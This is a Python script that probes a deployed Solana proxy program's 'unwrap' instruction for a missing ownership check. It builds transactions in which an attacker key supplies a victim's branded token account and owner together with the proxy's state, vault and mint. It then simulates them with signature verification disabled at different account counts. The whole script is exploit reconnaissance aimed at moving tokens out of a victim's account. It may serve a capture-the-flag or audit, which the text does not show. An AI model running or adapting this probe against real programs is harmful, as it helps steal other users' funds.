#!/usr/bin/env python3
"""Find how many accounts the deployed proxy `unwrap` requires, then probe ownership."""
import json, base64, os, sys
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from solrpc import rpc
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.message import Message
from solders.transaction import Transaction
from solders.hash import Hash
from solders.signature import Signature

PROXY = Pubkey.from_string("pRoxYU64BSjv8HbhENna8a7LVCrkzzNrnvbYuTwas8C")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
SYSTEM = Pubkey.from_string("11111111111111111111111111111111")
ATA_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
PROXY_STATE0 = Pubkey.from_string("FD4YydhzPpSmXwnHsX1oJBE4er4m9mg4ezaBN9cXgQbz")
PROXY_VAULT0 = Pubkey.from_string("E5ohyMVkBTdn3DekUPcFyLFF2Wi78Rg3Mt9QQDWgN5Mp")
BRANDED_MINT = Pubkey.from_string("sro4agJ6nJ89MJgj2DfDdx8zXVqSyZfCZjbhBfQaJU5")
ORACLE = Pubkey.from_string("4DyKf93NzxTruQh5KMWGH9NkoE32tBBf33m3zyu2Efm3")
USDC_PLUS = Pubkey.from_string("AvZZF1YaZDziPY2RCK4oJrRVrbN3mTD9NL24hPeaZeUj")
VICTIM_BRANDED = Pubkey.from_string("7cfj48Ym6zsu8WfPtDrU3ERw4Y1WxRzrqd9gF7KrWiJv")
VICTIM_OWNER = Pubkey.from_string("GwJuWxL4GD38XnAa1d3ZdhAWRupnwgqavCqovpL4aTo8")
POOL0_ATA0 = Pubkey.from_string("Dh1sPTGc9YycHKnw5t4S1Ss24TtcoWTiD61azGSmtoS5")
ATTACKER = Pubkey.new_unique()

def ata(mint, owner):
    return Pubkey.find_program_address([bytes(owner), bytes(TOKEN), bytes(mint)], ATA_PROG)[0]

def simulate(ix, label, payer):
    msg = Message.new_with_blockhash([ix], payer, Hash.default())
    tx = Transaction.populate(msg, [Signature.default()] * msg.header.num_required_signatures)
    raw = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction", [raw, {"encoding": "base64", "sigVerify": False,
                                          "replaceRecentBlockhash": True, "commitment": "processed"}])
    val = (r.get("result") or {}).get("value") or {}
    err = json.dumps(val.get("err")) if val.get("err") else None
    logs = [l.replace("Program log: ", "") for l in (val.get("logs") or []) if "Program log" in l]
    print(f"{label:52} n={len(ix.accounts)} err={err} units={val.get('unitsConsumed')} logs={logs[:4]}")
    return val

data = bytes([2]) + (1000000).to_bytes(8, "little") + (0).to_bytes(8, "little")
base = [
    AccountMeta(ATTACKER, True, False),
    AccountMeta(ata(USDC_PLUS, ATTACKER), False, True),
    AccountMeta(VICTIM_BRANDED, False, True),
    AccountMeta(PROXY_STATE0, False, True),
    AccountMeta(PROXY_VAULT0, False, True),
    AccountMeta(BRANDED_MINT, False, True),
    AccountMeta(ORACLE, False, False),
    AccountMeta(TOKEN, False, False),
    AccountMeta(SYSTEM, False, False),
    AccountMeta(PROXY, False, False),
    AccountMeta(ATA_PROG, False, False),
    AccountMeta(POOL0_ATA0, False, False),
    AccountMeta(USDC_PLUS, False, False),
    AccountMeta(VICTIM_OWNER, False, False),
]
for n in range(8, 15):
    accs = base[:n]
    simulate(Instruction(PROXY, data, accs), f"unwrap attacker/victim branded, {n} accounts", ATTACKER)
